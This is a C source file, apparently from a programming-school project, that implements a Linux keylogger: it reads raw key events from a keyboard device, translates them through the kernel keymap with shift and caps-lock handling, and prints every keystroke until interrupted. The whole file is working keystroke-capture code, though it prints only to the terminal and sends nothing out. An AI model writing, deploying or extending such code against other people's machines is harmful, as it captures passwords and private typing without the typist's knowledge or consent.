#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <wchar.h>

#include "keylogger.h"
#include "keys.h"
#include "debug.h"
#include <errno.h>
#include <string.h>

static int			loop;

static void 		sigint(int sig)
{
	if (sig == SIGINT)
		loop = 0;
}

static int  		print_keysym(int *key, int state, int *lockers)
{
	static int		modifier = 0;
	int				code;
	int 			type;
	int 			value;

	code = key[modifier];
	type = KTYP(code);
	value = KVAL(code);
	if (type >= syms_size) {
		code = code ^ 0xf000;
		if (code < 0)
			return printf("<(null)>");
		if (code < 0x80)
			return printf("%s", iso646_syms[code]);
		return printf("[%#04x]", code);
	}
	if (type == KT_LETTER)
		type = KT_LATIN;
	if (type < syms_size && value < syms[type].size) {
		if (type == KT_SHIFT)
			return shift_handler(value, state, &modifier);
		if (type == KT_LOCK)
			return lock_handler(value, state, &modifier, lockers);
		if (state)
			return printf("%s", syms[type].table[value]);
	}
	if (type == KT_META && value < syms[0].size)
		return printf("<Meta_%s>", syms[0].table[value]);
	if (state)
		return printf("[%#04x]", code);
	return 0;
}

void					keylogger(int keybd, int **key_table)
{
	int					nbread;			// Number of events received at once.
	struct input_event	events[128];	// Events read.
	int					lockers[NR_LOCK];

	for (int i = 0; i < NR_LOCK; i++)
		lockers[i] = 0;
	signal(SIGINT, sigint);
	lockers[6] = get_keystate(1); // capslock state
//	lockers[?] = get_keystate(2); // numlock state
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			if (events[i].type == EV_KEY) {
				print_keysym(key_table[events[i].code], events[i].value, lockers);
				fflush(stdout);
			}
		}
	}
}
